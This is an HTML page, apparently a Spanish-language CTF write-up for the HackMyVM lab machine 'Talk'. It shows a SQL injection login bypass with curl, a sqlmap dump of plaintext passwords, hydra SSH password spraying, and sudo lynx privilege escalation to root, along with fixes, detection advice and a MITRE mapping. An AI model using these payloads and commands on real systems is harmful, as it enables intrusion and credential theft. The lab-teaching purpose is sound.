+  <div class="section-title">
+    <span class="section-number">3</span>
+    <h2>SQL Injection — Bypass de Autenticación</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — SQLi manual en login</div>
+    <h3>Bypass de autenticación con payload clásico</h3>
+
+    <div class="why-box">
+      <strong>¿Qué es SQL Injection y por qué lo probamos aquí?</strong>
+      <p>SQL Injection ocurre cuando el input del usuario se concatena directamente en una query SQL sin sanitizar. El login de chatME muestra credenciales incorrectas sin bloqueo ni captcha — señal de un formulario vulnerable. El payload <code>' OR 1=1-- -</code> es el primer test estándar: cierra el string, inyecta una condición siempre verdadera, y comenta el resto de la query.</p>
+    </div>
+
+    <div class="sqli-box">
+      <div class="sqli-row">
+        <span class="sqli-label">Query original:</span>
+        <span class="sqli-query">
+          <span class="q-keyword">SELECT</span> * <span class="q-keyword">FROM</span> user
+          <span class="q-keyword">WHERE</span> username=<span class="q-string">'admin'</span>
+          <span class="q-keyword">AND</span> password=<span class="q-string">'admin'</span>
+        </span>
+      </div>
+      <hr class="sqli-divider">
+      <div class="sqli-row">
+        <span class="sqli-label">Con payload:</span>
+        <span class="sqli-query">
+          <span class="q-keyword">SELECT</span> * <span class="q-keyword">FROM</span> user
+          <span class="q-keyword">WHERE</span> username=<span class="q-string">''</span>
+          <span class="q-inject"> OR 1=1</span>
+          <span class="q-comment">-- -' AND password='...'</span>
+          <span class="q-result">← siempre TRUE → devuelve primer usuario</span>
+        </span>
+      </div>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">curl</span>
+        <span class="flag-opt"> -s</span>
+        <span class="flag-opt"> -L</span>
+        <span class="flag-opt"> -d</span>
+        <span class="str-c"> "username=%27+OR+1%3D1--+-&amp;password=%27+OR+1%3D1--+-"</span>
+        <span class="ip"> http://10.0.2.18/login.php</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-s</code> → silent (sin barra de progreso)</div>
+        <div class="cmd-note"><code>-L</code> → seguir redirecciones (303 → home.php si login exitoso)</div>
+        <div class="cmd-note"><code>-d "username=...&password=..."</code> → enviar como POST con los payloads URL-encoded</div>
+        <div class="cmd-note"><code>%27</code> → <code>'</code> (comilla) | <code>%3D</code> → <code>=</code> | <code>--+-</code> → comentario SQL</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output — respuesta del servidor</div>
+      <pre>&lt;title&gt;chatME&lt;/title&gt;
+&lt;link rel="stylesheet" href="css/home.css"&gt;
+&lt;table id="chat_room"...&gt;
+  &lt;th&gt;&lt;h4&gt;Hi, &lt;a href="profile.php?userid=1"&gt;<span class="hl-flag">PaoPao</span>&lt;/a&gt;
+  — &lt;a href="logout.php"&gt;Logout&lt;/a&gt;&lt;/h4&gt;&lt;/th&gt;
+  &lt;td&gt;Welcome to chatME!&lt;/td&gt;
+
+HTTP redirect → <span class="hl-flag">home.php (200 OK)</span></pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>Redirigió a <code>home.php</code> con sesión activa → <span class="badge-green">bypass de login confirmado</span></li>
+        <li>El usuario autenticado es <code>PaoPao</code> (userid=1) — el primer registro de la tabla</li>
+        <li>El panel muestra un chat con mensajes de otros usuarios — posible info adicional</li>
+        <li>La app es vulnerable a SQLi básica sin ningún tipo de WAF ni sanitización</li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>SQLi confirmada. Usar sqlmap para extraer la base de datos completa con credenciales de todos los usuarios.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 4. SQLMAP ═══════════════════ -->
+<div class="section" id="sqlmap">
+  <div class="section-title">
+    <span class="section-number">4</span>
+    <h2>sqlmap — Extracción de Base de Datos</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 3 — sqlmap con petición capturada</div>
+    <h3>Dump completo de credenciales</h3>
+
+    <div class="why-box">
+      <strong>¿Qué es sqlmap y por qué usarlo aquí?</strong>
+      <p>sqlmap automatiza la detección y explotación de SQL Injection. Mientras el bypass manual confirma la vulnerabilidad, sqlmap nos permite extraer la estructura completa de la base de datos (tablas, columnas, datos) sin construir payloads manualmente. Se le pasa la petición HTTP capturada con BurpSuite para que use exactamente la misma estructura de la petición vulnerable.</p>
+    </div>
+
+    <p style="color:var(--text2);font-size:.9rem;margin-bottom:.75rem;">Primero capturamos la petición POST del login en BurpSuite y la guardamos en <code>request.txt</code>:</p>
+
+    <div class="output-box">
+      <div class="output-label">request.txt — petición capturada</div>
+      <pre>POST /login.php HTTP/1.1
+Host: 10.0.2.18
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=ghostops1234
+
+username=admin&amp;password=admin</pre>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">sqlmap</span>
+        <span class="flag-opt"> -r</span>
+        <span class="param"> request.txt</span>
+        <span class="flag-opt"> --batch</span>
+        <span class="flag-opt"> -D</span>
+        <span class="param"> chat</span>
+        <span class="flag-opt"> -T</span>
+        <span class="param"> user</span>
+        <span class="flag-opt"> --dump</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-r request.txt</code> → leer la petición HTTP desde archivo (incluye cookies, headers, body completo)</div>
+        <div class="cmd-note"><code>--batch</code> → responder automáticamente a todas las preguntas interactivas con el valor por defecto</div>
+        <div class="cmd-note"><code>-D chat</code> → seleccionar la base de datos "chat" (la de la aplicación)</div>
+        <div class="cmd-note"><code>-T user</code> → seleccionar la tabla "user"</div>
+        <div class="cmd-note"><code>--dump</code> → volcar todos los registros de la tabla seleccionada</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output sqlmap — tipo de inyección detectado</div>
+      <pre>Parameter: <span class="hl-info">username (POST)</span>
+    Type: <span class="hl-warn">time-based blind</span>
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))SCeI) AND 'HyyM'='HyyM
+
+back-end DBMS: <span class="hl-info">MySQL &gt;= 5.0.12 (MariaDB fork)</span>
+web application technology: Nginx 1.14.2</pre>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output sqlmap — credenciales extraídas</div>
+      <pre>Database: chat
+Table: user
+[5 entries]
++--------+-----------------+-------------+-------------------+----------+-----------+
+| userid | email           | phone       | <span class="hl-flag">password</span>          | username | your_name |
++--------+-----------------+-------------+-------------------+----------+-----------+
+| 5      | david@david.com | 11          | <span class="hl-warn">adrianthebest</span>    | david    | david     |
+| 4      | jerry@jerry.com | 111         | <span class="hl-warn">thatsmynonapass</span>  | jerry    | jerry     |
+| 2      | nona@nona.com   | 1111        | <span class="hl-warn">myfriendtom</span>      | nona     | nona      |
+| 1      | pao@yahoo.com   | 09123123123 | <span class="hl-warn">pao</span>              | pao      | PaoPao    |
+| 3      | tina@tina.com   | 11111       | <span class="hl-warn">davidwhatpass</span>   | tina     | tina      |
++--------+-----------------+-------------+-------------------+----------+-----------+</pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li><span class="badge-red">Contraseñas en TEXTO PLANO</span> — sin hash, sin cifrado. Error crítico de seguridad adicional</li>
+        <li>Patrón interesante: <code>jerry</code> usa la contraseña de <code>nona</code> (<code>thatsmynonapass</code>), y <code>tina</code> usa la de <code>david</code> (<code>davidwhatpass</code>) — las contraseñas se refieren a otros usuarios del chat</li>
+        <li>5 usuarios con emails reales → hacer spray SSH con todas las combinaciones</li>
+        <li>Inyección tipo <code>time-based blind</code> → la extracción es lenta (usa SLEEP) pero segura</li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Con 5 usuarios y 5 contraseñas en texto plano, hacer credential spraying SSH con hydra. 25 combinaciones posibles.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 5. HYDRA SSH ═══════════════════ -->
+<div class="section" id="hydra">
+  <div class="section-title">
+    <span class="section-number">5</span>
+    <h2>Hydra — Credential Spraying SSH</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 4 — Hydra SSH con wordlists</div>
+    <h3>Validar qué credenciales de la DB funcionan en SSH</h3>
+
+    <div class="why-box">
+      <strong>¿Por qué credential spraying y no usar directamente las credenciales?</strong>
+      <p>Tenemos 5 usuarios pero no sabemos cuáles tienen cuenta SSH. Las contraseñas están "cruzadas" (jerry tiene la de nona, etc.) — no podemos saber de memoria qué combinación funciona. Hydra prueba todas las combinaciones en paralelo y nos confirma cuáles son válidas en segundos.</p>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">hydra</span>
+        <span class="flag-opt"> -L</span>
+        <span class="param"> users.txt</span>
+        <span class="flag-opt"> -P</span>
+        <span class="param"> pass.txt</span>
+        <span class="param"> ssh://10.0.2.18</span>
+        <span class="flag-opt"> -t</span>
+        <span class="param"> 4</span>
+        <span class="flag-opt"> -I</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-L users.txt</code> → lista de usuarios (david, jerry, nona, pao, tina)</div>
+        <div class="cmd-note"><code>-P pass.txt</code> → lista de contraseñas (5 contraseñas del dump)</div>
+        <div class="cmd-note"><code>ssh://10.0.2.18</code> → protocolo SSH y host objetivo</div>
+        <div class="cmd-note"><code>-t 4</code> → 4 tareas paralelas (SSH rechaza demasiadas conexiones simultáneas)</div>
+        <div class="cmd-note"><code>-I</code> → ignorar sesión previa, comenzar desde cero</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output Hydra</div>
+      <pre>[DATA] max 4 tasks per 1 server, 25 login tries (l:5/p:5)
+[DATA] attacking ssh://10.0.2.18:22/
+<span class="hl-flag">[22][ssh] host: 10.0.2.18   login: nona    password: thatsmynonapass</span>
+<span class="hl-flag">[22][ssh] host: 10.0.2.18   login: david   password: davidwhatpass</span>
+<span class="hl-flag">[22][ssh] host: 10.0.2.18   login: jerry   password: myfriendtom</span>
+3 valid passwords found</pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>3 de 5 usuarios tienen las mismas credenciales que en la app web → <span class="badge-red">reutilización de contraseñas</span></li>
+        <li><code>nona:thatsmynonapass</code> — nona usa la contraseña de jerry (cross-credential)</li>
+        <li><code>david:davidwhatpass</code> — david usa la contraseña de tina</li>
+        <li><code>jerry:myfriendtom</code> — jerry usa la contraseña de nona</li>
+        <li>Entraremos como <code>nona</code> (tiene el archivo user.txt en su home)</li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>SSH como <code>nona</code> con <code>thatsmynonapass</code>. Obtener user flag y ejecutar <code>sudo -l</code> para enumerar privilegios.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 6. ACCESO SSH + USER FLAG ═══════════════════ -->
+<div class="section" id="ssh">
+  <div class="section-title">
+    <span class="section-number">6</span>
+    <h2>Acceso SSH — User Flag</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 5 — SSH como nona</div>
+    <h3>Foothold en el sistema y enumeración de privilegios</h3>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">ssh</span>
+        <span class="user-c"> nona</span>@<span class="ip">10.0.2.18</span>
+        <span class="comment-c">  # password: thatsmynonapass</span>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Sesión SSH — enumeración inicial</div>
+      <pre>nona@talk:~$ <span class="hl-info">id</span>
+uid=1000(nona) gid=1000(nona) groups=1000(nona),24(cdrom)...
+
+nona@talk:~$ <span class="hl-info">cat ~/user.txt</span>
+<span class="hl-flag">wordsarelies</span>
+
+nona@talk:~$ <span class="hl-info">sudo -l</span>
+Matching Defaults entries for nona on talk:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User nona may run the following commands on talk:
+<span class="hl-warn">    (ALL : ALL) NOPASSWD: /usr/bin/lynx</span></pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>User flag obtenida: <span class="badge-green">wordsarelies</span></li>
+        <li><code>sudo -l</code> revela que <code>nona</code> puede ejecutar <code>/usr/bin/lynx</code> como <strong>cualquier usuario</strong> (ALL:ALL) <strong>sin contraseña</strong> (NOPASSWD)</li>
+        <li><code>lynx</code> es un navegador web de texto para terminal — aparece en GTFOBins como binario abusable</li>
+        <li>Vector de privesc inmediato: <span class="badge-red">sudo GTFOBins via lynx</span></li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Usar <code>sudo lynx</code> para leer <code>/root/root.txt</code> directamente — lynx puede leer archivos locales como root sin necesitar una shell interactiva.</p>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-label">User Flag</div>
+    <div class="flag-value">wordsarelies</div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 7. PRIVILEGE ESCALATION ═══════════════════ -->
+<div class="section" id="privesc">
+  <div class="section-title">
+    <span class="section-number">7</span>
+    <h2>Privilege Escalation — sudo lynx (GTFOBins)</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 6 — sudo lynx como root</div>
+    <h3>Escalada via browser de texto con permiso sudo NOPASSWD</h3>
+
+    <div class="why-box">
+      <strong>¿Qué es GTFOBins y por qué lynx es peligroso con sudo?</strong>
+      <p>GTFOBins (Get The F*** Out Binaries) es un catálogo de binarios Unix que pueden ser explotados para escalar privilegios cuando se ejecutan con permisos elevados. <code>lynx</code> es un navegador web de texto que puede abrir archivos locales con <code>file:///path</code> o directamente con su ruta. Al ejecutarse con <code>sudo</code>, hereda los permisos de root y puede acceder a cualquier archivo del sistema, incluyendo <code>/root/root.txt</code>.</p>
+    </div>
+
+    <h3 style="margin-top:1.25rem;">Técnica 1: Leer archivo directamente (más rápido)</h3>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">sudo</span>
+        <span class="param"> lynx</span>
+        <span class="str-c"> /root/root.txt</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>sudo</code> → ejecutar el siguiente comando como root (permitido por el sudoers NOPASSWD)</div>
+        <div class="cmd-note"><code>lynx</code> → navegador de texto que puede abrir archivos locales además de URLs</div>
+        <div class="cmd-note"><code>/root/root.txt</code> → archivo al que solo root tiene acceso normalmente</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">lynx muestra el contenido del archivo como root</div>
+      <pre>                          <span class="hl-flag">talktomeroot</span>
+
+   Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
+ H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list</pre>
+    </div>
+
+    <h3 style="margin-top:1.25rem;">Técnica 2: Shell interactiva como root (alternativa)</h3>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">sudo</span>
+        <span class="param"> lynx</span>
+        <span class="comment-c">  # dentro de lynx: presionar SHIFT+! (exclamación mayúscula)</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>SHIFT+!</code> → dentro de lynx, lanza el shell por defecto del sistema heredando los permisos del proceso (root)</div>
+        <div class="cmd-note">Output: "Spawning your default shell. Use 'exit' to return to Lynx." → bash como root</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Shell root via SHIFT+!</div>
+      <pre>Spawning your default shell.  Use 'exit' to return to Lynx.
+
+<span class="hl-flag">root@talk:/home/nona# whoami</span>
+root
+root@talk:/home/nona# cat /root/root.txt
+<span class="hl-flag">talktomeroot</span></pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Por qué ambas técnicas funcionan?</strong>
+      <ul>
+        <li><strong>Técnica 1</strong> (leer archivo): lynx puede abrir rutas de archivos locales como si fueran URLs. Al ejecutarse como root vía <code>sudo</code>, puede leer cualquier archivo del sistema, incluso los solo accesibles por root.</li>
+        <li><strong>Técnica 2</strong> (shell): lynx tiene un mecanismo para "salir temporalmente a la shell" vía <code>SHIFT+!</code>. Esta shell hereda el usuario del proceso lynx — root — dando control total del sistema.</li>
+        <li>Ambas técnicas están documentadas en <a href="https://gtfobins.github.io/gtfobins/lynx/" target="_blank">GTFOBins/lynx</a></li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Resultado</strong>
+      <p>Root flag obtenida con el método directo (una sola línea, sin interacción): <code>sudo lynx /root/root.txt</code></p>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-label">Root Flag</div>
+    <div class="flag-value">talktomeroot</div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 8. GHOST-OPS ANÁLISIS ═══════════════════ -->
+<div class="section" id="ghostops">
+  <div class="section-title">
+    <span class="section-number">8</span>
+    <h2>Análisis Ghost-Ops — 3 Agentes</h2>
+  </div>
+
+  <div class="agent-panel">
+    <div class="agent-card rto">
+      <div class="agent-label">Red Team Operator</div>
+      <p>Vector inmediato: SQLi en login → sqlmap time-based blind → DB dump. Credenciales en texto plano = spray SSH directo. Privesc en 1 comando: sudo lynx lee root.txt sin shell interactiva. Cadena completa en ~15 minutos, 6 comandos.</p>
+    </div>
+    <div class="agent-card bta">
+      <div class="agent-label">Blue Team Analyst</div>
+      <p>Nivel de ruido: MEDIO. sqlmap time-based genera requests lentos pero numerosos (detectable en logs nginx). Hydra SSH deja múltiples failed-auth en auth.log antes de los éxitos. sudo lynx no genera alertas (binario legítimo del sistema).</p>
+    </div>
+    <div class="agent-card bhm">
+      <div class="agent-label">Black Hat Mindset</div>
+      <p>Las contraseñas están "cruzadas" — cada usuario tiene la contraseña de otro. El bypass manual reveló userid=1 (PaoPao), no el admin. El puerto 80 con cookie sin httponly sugiere XSS adicional. sudo lynx podría exfiltrar /etc/shadow o SSH keys como vectores alternativos.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 9. VULNERABILIDADES ═══════════════════ -->
+<div class="section" id="vulnerabilidades">
+  <div class="section-title">
+    <span class="section-number">9</span>
+    <h2>Análisis de Vulnerabilidades</h2>
+  </div>
+
+  <div class="vuln-card">
+    <h3>Vuln 1 — SQL Injection en login (CRÍTICA)</h3>
+    <div class="owasp-badge">OWASP A03:2021 — Injection | CWE-89: SQL Injection</div>
+    <p style="font-size:.9rem;color:var(--text2);margin:.75rem 0;">La aplicación construye la query SQL concatenando directamente el input del usuario sin sanitizar ni usar prepared statements.</p>
+    <div class="code-compare">
+      <div class="vuln-code">
+        <div class="code-header">❌ Código vulnerable</div>
+        <div class="code-box">$q = "SELECT * FROM user WHERE username='".$_POST['username']."' AND password='".$_POST['password']."'";</div>
+        <p class="code-note">Input del usuario insertado directamente → SQLi trivial</p>
+      </div>
+      <div class="safe-code">
+        <div class="code-header">✅ Fix correcto</div>
+        <div class="code-box">$stmt = $pdo->prepare("SELECT * FROM user WHERE username=? AND password=?"); $stmt->execute([$user, $pass]);</div>
+        <p class="code-note">Prepared statements → el input nunca es código SQL</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card">
+    <h3>Vuln 2 — Contraseñas en texto plano (CRÍTICA)</h3>
+    <div class="owasp-badge">OWASP A02:2021 — Cryptographic Failures | CWE-256: Unprotected Credentials</div>
+    <p style="font-size:.9rem;color:var(--text2);margin:.75rem 0;">La tabla <code>user</code> almacena contraseñas en texto plano. Si la DB es comprometida (vía SQLi u otros vectores), todas las contraseñas son inmediatamente utilizables — sin necesidad de crackeo.</p>
+    <p style="font-size:.88rem;color:var(--text3);margin-top:.5rem;"><strong style="color:var(--green);">Fix:</strong> Usar bcrypt, Argon2id o scrypt con un factor de coste apropiado. Nunca MD5/SHA1 para contraseñas.</p>
+  </div>
+
+  <div class="vuln-card">
+    <h3>Vuln 3 — sudo NOPASSWD sobre binario GTFOBin (ALTA)</h3>
+    <div class="owasp-badge">CWE-269: Improper Privilege Management | MITRE T1548.003</div>
+    <p style="font-size:.9rem;color:var(--text2);margin:.75rem 0;">Conceder <code>sudo NOPASSWD</code> a un browser de texto (<code>lynx</code>) es equivalente a dar acceso root al usuario. Cualquier herramienta que pueda leer archivos, ejecutar comandos o abrir shells es un vector de escalada garantizado.</p>
+    <p style="font-size:.88rem;color:var(--text3);margin-top:.5rem;"><strong style="color:var(--green);">Fix:</strong> Auditar el archivo <code>/etc/sudoers</code> regularmente. Nunca dar sudo a browsers, editores, intérpretes o cualquier binario en GTFOBins.</p>
+  </div>
+
+  <div class="vuln-card">
+    <h3>Vuln 4 — Cookie de sesión sin httponly (MEDIA)</h3>
+    <div class="owasp-badge">OWASP A05:2021 — Security Misconfiguration | CWE-1004</div>
+    <p style="font-size:.9rem;color:var(--text2);margin:.75rem 0;">La cookie <code>PHPSESSID</code> no tiene el flag <code>httponly</code>, lo que permite su robo mediante XSS. Combinado con el SQLi, un atacante podría robar sesiones activas de otros usuarios.</p>
+    <p style="font-size:.88rem;color:var(--text3);margin-top:.5rem;"><strong style="color:var(--green);">Fix:</strong> <code>session.cookie_httponly = 1</code> en php.ini, o <code>ini_set('session.cookie_httponly', 1)</code> en el código.</p>
+  </div>
+</div>
+
+<!-- ═══════════════════ 10. LECCIONES ═══════════════════ -->
+<div class="section" id="lecciones">
+  <div class="section-title">
+    <span class="section-number">10</span>
+    <h2>Lecciones Aprendidas</h2>
+  </div>
+
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>⚔️ Para el Atacante</h4>
+      <ul>
+        <li>Login form + PHP = probar siempre <code>' OR 1=1-- -</code> como primer test de SQLi</li>
+        <li>DB con contraseñas en texto plano → spray inmediato contra SSH, FTP y todos los servicios disponibles</li>
+        <li><code>sudo -l</code> es siempre el primer comando post-foothold — revisar GTFOBins para cualquier binario listado</li>
+        <li><code>sudo lynx /ruta/archivo</code> lee archivos como root directamente — más limpio que buscar una shell</li>
+        <li>Contraseñas "cruzadas" en apps de chat: el usuario puede tener la contraseña de otro — probar TODAS las combinaciones</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡️ Para el Defensor</h4>
+      <ul>
+        <li>Activar WAF con reglas SQLi en nginx (ModSecurity, NAXSI)</li>
+        <li>Logs nginx: alertar sobre <code>OR 1=1</code>, <code>UNION SELECT</code>, <code>SLEEP(</code> en parámetros POST</li>
+        <li>auth.log: más de 5 failed SSH en 60s desde misma IP → ban automático (fail2ban)</li>
+        <li>Auditar <code>sudo -l</code> de todos los usuarios regularmente — especialmente NOPASSWD</li>
+        <li>Nunca almacenar contraseñas en texto plano — bcrypt con cost factor ≥12</li>
+        <li>IOCs: hydra establece múltiples conexiones SSH simultáneas con diferentes usuarios en pocos segundos</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 11. MITRE ATT&CK ═══════════════════ -->
+<div class="section" id="mitre">
+  <div class="section-title">
+    <span class="section-number">11</span>
+    <h2>MITRE ATT&amp;CK</h2>
+  </div>
+  <table class="data-table">
+    <tr>
+      <th>ID</th>
+      <th>Técnica</th>
+      <th>Fase</th>
+      <th>Uso en Talk</th>
+    </tr>
+    <tr>
+      <td><code>T1046</code></td>
+      <td>Network Service Discovery</td>
+      <td><span class="badge-blue">Recon</span></td>
+      <td>Nmap descubre SSH 22 y nginx 80</td>
+    </tr>
+    <tr>
+      <td><code>T1190</code></td>
+      <td>Exploit Public-Facing Application</td>
+      <td><span class="badge-red">Initial Access</span></td>
+      <td>SQLi en login.php de chatME — bypass de autenticación</td>
+    </tr>
+    <tr>
+      <td><code>T1078.003</code></td>
+      <td>Valid Accounts: Local Accounts</td>
+      <td><span class="badge-red">Initial Access</span></td>
+      <td>Credenciales válidas del dump DB para SSH (nona:thatsmynonapass)</td>
+    </tr>
+    <tr>
+      <td><code>T1110.003</code></td>
+      <td>Brute Force: Password Spraying</td>
+      <td><span class="badge-red">Credential Access</span></td>
+      <td>Hydra prueba las 25 combinaciones usuario:contraseña contra SSH</td>
+    </tr>
+    <tr>
+      <td><code>T1552.001</code></td>
+      <td>Credentials In Files</td>
+      <td><span class="badge-yellow">Credential Access</span></td>
+      <td>Contraseñas en texto plano en DB MySQL (tabla user)</td>
+    </tr>
+    <tr>
+      <td><code>T1548.003</code></td>
+      <td>Abuse Elevation Control Mechanism: Sudo</td>
+      <td><span class="badge-red">Privilege Escalation</span></td>
+      <td>sudo NOPASSWD lynx → leer /root/root.txt como root</td>
+    </tr>
+    <tr>
+      <td><code>T1059.004</code></td>
+      <td>Command and Scripting Interpreter: Unix Shell</td>
+      <td><span class="badge-red">Execution</span></td>
+      <td>Shell root vía SHIFT+! en lynx como alternativa de privesc</td>
+    </tr>
+  </table>
+</div>
+
+</main>
+
+<!-- ═══════════════════ SIDEBAR ═══════════════════ -->
+<aside class="sidebar">
+
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">Máquina</span><span class="meta-value">Talk</span></div>
+    <div class="meta-row"><span class="meta-label">Plataforma</span><span class="meta-value">HackMyVM</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value" style="color:var(--green);">Easy</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Linux (Debian 10)</span></div>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.0.2.18</span></div>
+    <div class="meta-row"><span class="meta-label">Puertos</span><span class="meta-value">22, 80</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-04-11</span></div>
+    <div class="meta-row"><span class="meta-label">Tiempo</span><span class="meta-value">~15 min</span></div>
+    <div class="meta-row"><span class="meta-label">Comandos</span><span class="meta-value">6</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Herramientas Usadas</h4>
+    <div class="tool-row"><span class="tool-name">nmap</span><span class="tool-desc">Port scan + NSE scripts</span></div>
+    <div class="tool-row"><span class="tool-name">curl</span><span class="tool-desc">Verificar SQLi bypass</span></div>
+    <div class="tool-row"><span class="tool-name">sqlmap</span><span class="tool-desc">Extracción automática DB</span></div>
+    <div class="tool-row"><span class="tool-name">hydra</span><span class="tool-desc">SSH credential spraying</span></div>
+    <div class="tool-row"><span class="tool-name">ssh</span><span class="tool-desc">Acceso al sistema</span></div>
+    <div class="tool-row"><span class="tool-name">lynx</span><span class="tool-desc">GTFOBin → privesc root</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <div style="margin-top:.25rem;">
+      <span class="mitre-tag">T1046</span>
+      <span class="mitre-tag">T1190</span>
+      <span class="mitre-tag">T1078.003</span>
+      <span class="mitre-tag">T1110.003</span>
+      <span class="mitre-tag">T1552.001</span>
+      <span class="mitre-tag">T1548.003</span>
+      <span class="mitre-tag">T1059.004</span>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <div class="score-num">72</div>
+    <div class="score-label">Difficulty Score / 100</div>
+    <p style="font-size:.75rem;color:var(--text3);text-align:center;margin-top:.5rem;">SQLi + plaintext creds + sudo GTFOBin = cadena Easy predecible pero educativa</p>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Flags</h4>
+    <div class="meta-row">
+      <span class="meta-label">User</span>
+      <span class="meta-value" style="color:var(--green);">wordsarelies</span>
+    </div>
+    <div class="meta-row">
+      <span class="meta-label">Root</span>
+      <span class="meta-value" style="color:var(--green);">talktomeroot</span>
+    </div>
+    <div class="meta-row">
+      <span class="meta-label">SSH user</span>
+      <span class="meta-value" style="color:var(--yellow);">nona</span>
+    </div>
+    <div class="meta-row">
+      <span class="meta-label">SSH pass</span>
+      <span class="meta-value" style="color:var(--yellow);">thatsmynonapass</span>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Glosario</h4>
+    <div class="glosario-item">
+      <span class="glosario-term">SQL Injection</span>
+      <span class="glosario-def">Vulnerabilidad donde input malicioso se interpreta como código SQL, permitiendo bypass de autenticación o extracción de datos</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">sqlmap</span>
+      <span class="glosario-def">Herramienta automática de detección y explotación de SQLi. Soporta múltiples técnicas: union, blind, time-based</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">Time-based blind SQLi</span>
+      <span class="glosario-def">Tipo de SQLi donde no hay output visible — la información se extrae midiendo el tiempo de respuesta del servidor</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">GTFOBins</span>
+      <span class="glosario-def">Catálogo de binarios Unix que pueden ser abusados para escalar privilegios cuando se ejecutan con permisos elevados</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">sudo NOPASSWD</span>
+      <span class="glosario-def">Permiso que permite ejecutar un comando como root sin introducir contraseña — extremadamente peligroso con binarios interactivos</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">lynx</span>
+      <span class="glosario-def">Browser web de texto para terminal. Puede leer archivos locales y ejecutar shells — GTFOBin si tiene sudo</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">Credential Spraying</span>
+      <span class="glosario-def">Probar las mismas contraseñas contra múltiples usuarios o servicios para encontrar reutilización de credenciales</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">Hydra</span>
+      <span class="glosario-def">Herramienta de fuerza bruta de autenticación multi-protocolo (SSH, FTP, HTTP, SMB, etc.)</span>
+    </div>
+  </div>
+
+</aside>
+</div>
+
